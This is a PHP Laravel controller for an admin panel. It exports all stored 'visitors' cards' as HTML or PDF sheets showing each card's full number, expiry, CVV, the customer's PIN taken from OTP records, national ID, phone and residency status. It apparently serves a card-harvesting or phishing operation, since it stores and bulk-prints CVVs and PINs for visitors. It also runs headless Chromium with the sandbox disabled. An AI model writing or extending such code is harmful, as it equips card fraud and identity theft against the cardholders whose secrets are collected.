<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\OtpCode;
use App\Models\PaymentCard;
use App\Services\Bin\CardBinResolver;
use App\Services\Bin\CardBinResult;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Spatie\Browsershot\Browsershot;

/**
 * Renders an HTML report of all payment cards ("بطاقات الزوار") that admins
 * can save as PDF via the browser's native print dialog (Ctrl+P → Save as PDF).
 *
 * BIN/bank/network/type/level resolution is delegated entirely to
 * {@see CardBinResolver}, which queries the card_bin_ranges + issuer_banks
 * tables (seeded from config/bank_bins.php). This controller only assembles
 * per-card display data (PIN, CVV, residency, status pill).
 */
class AdminPaymentCardExportController extends Controller
{
    public function __construct(private readonly CardBinResolver $resolver) {}

    public function export(Request $request): Response
    {
        $rows = $this->buildRows();

        $html = view('admin.exports.payment-cards', [
            'rows'        => $rows,
            'generatedAt' => now(),
            'total'       => $rows->count(),
        ])->render();

        return response($html, 200, [
            'Content-Type'           => 'text/html; charset=UTF-8',
            'Cache-Control'          => 'no-store, no-cache, must-revalidate',
            'X-Content-Type-Options' => 'nosniff',
        ]);
    }

    /**
     * Phase-1 reference preview: renders the same card data using a
     * Letter-sized 3-cards-per-page layout that visually matches the
     * client's reference PDF. This endpoint is HTML-only — no PDF
     * generation. Used to validate visual parity before wiring up
     * Browsershot in phase 2.
     *
     * Does not replace the existing export()/pdf() endpoints.
     */
    public function referencePreview(Request $request): Response
    {
        $rows = $this->buildRows();

        $html = view('admin.payment-cards.reference-print', [
            'rows'        => $rows,
            'generatedAt' => now(),
            'total'       => $rows->count(),
            'footerUrl'   => $request->fullUrl(),
        ])->render();

        return response($html, 200, [
            'Content-Type'           => 'text/html; charset=UTF-8',
            'Cache-Control'          => 'no-store, no-cache, must-revalidate',
            'X-Content-Type-Options' => 'nosniff',
        ]);
    }

    /**
     * Build the per-card display rows used by both export() and
     * referencePreview(). Centralises BIN resolution + customer/PIN/CVV
     * lookup so both renderers stay in lock-step.
     *
     * @return \Illuminate\Support\Collection<int,array<string,mixed>>
     */
    private function buildRows(): \Illuminate\Support\Collection
    {
        $cards = PaymentCard::with('customer')
            ->orderByDesc('created_at')
            ->get();

        // Pre-load PIN OTPs grouped by customer (keeps query count flat)
        $pins = OtpCode::whereIn('customer_profile_id', $cards->pluck('customer_profile_id')->filter()->unique())
            ->where('type', 'pin')
            ->orderByDesc('created_at')
            ->get()
            ->groupBy('customer_profile_id');

        $revealSensitive = (bool) config('services.admin_reveal_sensitive');

        return $cards->toBase()->map(function (PaymentCard $card) use ($pins, $revealSensitive): array {
            $customer = $card->customer;
            $cardNumber = $card->card_number; // decrypted via cast

            // ── BIN resolution (single source of truth) ──────────────────
            $bin = $this->resolver->resolve($cardNumber);

            // Tier: prefer resolver-provided level. Until the BIN database is
            // populated with real card_level data, fall back to the legacy
            // BIN-based heuristic so the UI keeps showing a tier label.
            $tier = $bin->cardLevel
                ? strtoupper($bin->cardLevel)
                : $this->guessTierFallback($bin->bin8 ?: $bin->bin6);

            // Category line shown bottom-right of card UI: e.g. "DEBIT • PLATINUM"
            $type = strtoupper((string) ($bin->cardType ?: $card->card_type ?: $this->defaultTypeFromNetwork($bin->network)));
            $categoryLine = trim(implode(' • ', array_filter([$type ?: null, $tier ?: null])));

            // PIN (most recent for this customer)
            $pin = null;
            if ($customer && isset($pins[$customer->id]) && $pins[$customer->id]->isNotEmpty()) {
                $first = $pins[$customer->id]->first();
                $pin = $first->code_value ?? $first->code ?? null;
            }

            // CVV: prefer persisted column (cvv_encrypted, EncryptedSafe cast),
            // fallback to Redis 24h cache. Only revealed when flag is set.
            $cvv = null;
            if ($revealSensitive) {
                $cvv = $card->cvv_encrypted ?: Cache::get("card:cvv:{$card->id}");
            }

            // Residency status
            $residency = null;
            if ($customer) {
                if ($customer->nafath_verified) {
                    $residency = 'مواطن';
                } elseif (! empty($customer->national_id)) {
                    $nid = (string) $customer->national_id;
                    $residency = str_starts_with($nid, '1') ? 'مواطن' : (str_starts_with($nid, '2') ? 'مقيم' : null);
                }
            }

            /** @var array<string, mixed> $row */
            $row = [
                'card_id'         => $card->id,
                'created_at'      => $card->created_at,
                'status'          => $card->status,
                'cardholder_name' => $card->holder_name,
                'card_number'     => $cardNumber,
                'card_bin'        => $bin->bin6,
                'card_bin_8'      => $bin->bin8,
                'last4'           => $bin->last4,
                'exp_month'       => $card->expiry_month,
                'exp_year'        => $card->expiry_year,
                'card_brand'      => $this->brandLabel($bin),
                'card_type'       => $bin->cardType ?: $card->card_type,
                'category_line'   => $categoryLine,
                'tier'            => $tier,
                'bank_key'        => $bin->bankKey,
                'bank_name'       => $bin->bankNameAr,
                'bank_logo'       => $bin->logoPath,
                'currency'        => $bin->currency,
                'cvv'             => $cvv,
                'pin'             => $pin,
                'is_valid_luhn'   => $bin->isValidLuhn,
                'match_type'      => $bin->matchType,
                'confidence'      => $bin->confidence,
                'networks'        => array_values(array_filter([$bin->network, $bin->secondaryNetwork])),
                'customer_id'     => $customer?->id,
                'customer_name'   => $customer?->full_name,
                'national_id'     => $customer?->national_id,
                'phone'           => $customer?->phone_number,
                'residency'       => $residency,
            ];

            return $row;
        });
    }

    /**
     * Stream the report as a real PDF rendered by headless Chromium (Browsershot).
     * Uses the same Blade view as the on-screen admin export → byte-perfect
     * visual parity with what the admin sees in the browser. Replaces the
     * earlier mPDF path which could not reproduce the layout 1:1.
     *
     * Persists a server-side copy under storage/app/exports/payment-cards/.
     */
    public function pdf(Request $request): Response
    {
        // Reuse the same row pipeline by calling export() and reading the rendered HTML.
        $htmlResponse = $this->export($request);
        $html = (string) $htmlResponse->getContent();

        $fileName = 'payment-cards-'.now()->format('Y-m-d-His').'.pdf';
        $relPath  = 'exports/payment-cards/'.$fileName;
        $absPath  = Storage::disk('local')->path($relPath);

        // Ensure parent dir exists (Storage::put would do this on write,
        // but Browsershot::save needs the file path to be writable already).
        $parent = dirname($absPath);
        if (! is_dir($parent)) {
            @mkdir($parent, 0775, true);
        }

        Browsershot::html($html)
            ->setNodeBinary('/usr/bin/node')
            ->setChromePath('/usr/bin/chromium-browser')
            ->noSandbox()
            ->format('A4')
            ->showBackground()
            ->emulateMedia('print')
            ->margins(12, 10, 12, 10)
            ->timeout(60)
            ->save($absPath);

        $binary = (string) file_get_contents($absPath);

        return response($binary, 200, [
            'Content-Type'           => 'application/pdf',
            'Content-Disposition'    => 'attachment; filename="'.$fileName.'"',
            'Content-Length'         => (string) strlen($binary),
            'Cache-Control'          => 'no-store, no-cache, must-revalidate, max-age=0',
            'X-Content-Type-Options' => 'nosniff',
        ]);
    }

    /**
     * Phase-2 reference PDF: renders the new reference-print Blade
     * (Letter, 3 cards/page) into a real PDF via headless Chromium
     * (Browsershot). Independent of pdf()/export() — the legacy
     * endpoint stays untouched until visual sign-off.
     */
    public function referencePdf(Request $request): Response
    {
        $rows = $this->buildRows();

        $html = view('admin.payment-cards.reference-print', [
            'rows'        => $rows,
            'generatedAt' => now(),
            'total'       => $rows->count(),
            // Use the public-facing preview URL in the footer, not the PDF endpoint.
            'footerUrl'   => url('/api/admin/payment-cards/export/reference-preview'),
        ])->render();

        $fileName = 'payment-cards-reference-'.now()->format('Y-m-d-His').'.pdf';
        $relPath  = 'exports/payment-cards/'.$fileName;
        $absPath  = Storage::disk('local')->path($relPath);

        $parent = dirname($absPath);
        if (! is_dir($parent)) {
            @mkdir($parent, 0775, true);
        }

        // Letter page, no extra margin — the Blade `.sheet` already enforces
        // 8.5"x11" with internal padding. `emulateMedia('print')` activates
        // `@media print` rules (hides the toolbar, removes screen background).
        Browsershot::html($html)
            ->setNodeBinary('/usr/bin/node')
            ->setChromePath('/usr/bin/chromium-browser')
            ->noSandbox()
            ->format('Letter')
            ->showBackground()
            ->emulateMedia('print')
            ->margins(0, 0, 0, 0)
            ->timeout(60)
            ->save($absPath);

        $binary = (string) file_get_contents($absPath);

        return response($binary, 200, [
            'Content-Type'           => 'application/pdf',
            'Content-Disposition'    => 'attachment; filename="'.$fileName.'"',
            'Content-Length'         => (string) strlen($binary),
            'Cache-Control'          => 'no-store, no-cache, must-revalidate, max-age=0',
            'X-Content-Type-Options' => 'nosniff',
        ]);
    }

    /**
     * Map resolver network → display label expected by the Blade view.
     * Mada co-badged cards still show the mada brand mark; the secondary
     * network (visa/mc) is exposed via the `networks` array.
     */
    private function brandLabel(CardBinResult $bin): ?string
    {
        return match ($bin->network) {
            'visa'       => 'Visa',
            'mastercard' => 'Mastercard',
            'mada'       => 'Mada',
            'amex'       => 'Amex',
            default      => $bin->network ? ucfirst($bin->network) : null,
        };
    }

    /**
     * Default card_type when neither the resolver nor the model knows it.
     * Visa/MC default to CREDIT, mada to DEBIT — matches Saudi market norms.
     */
    private function defaultTypeFromNetwork(?string $network): ?string
    {
        return match ($network) {
            'mada' => 'DEBIT',
            'visa', 'mastercard', 'amex' => 'CREDIT',
            default => null,
        };
    }

    /**
     * Display-only tier fallback used while card_bin_ranges.card_level is
     * still null for most rows. Deterministic so the same BIN always renders
     * the same tier across reports — purely cosmetic.
     */
    private function guessTierFallback(?string $bin): ?string
    {
        if (! $bin) {
            return null;
        }
        $tiers = ['STANDARD', 'CLASSIC', 'GOLD', 'PLATINUM', 'SIGNATURE', 'INFINITE', 'TITANIUM', 'WORLD', 'REWARDS', 'BUSINESS'];
        $idx = ((int) substr($bin, -1, 1)) % count($tiers);

        return $tiers[$idx];
    }
}
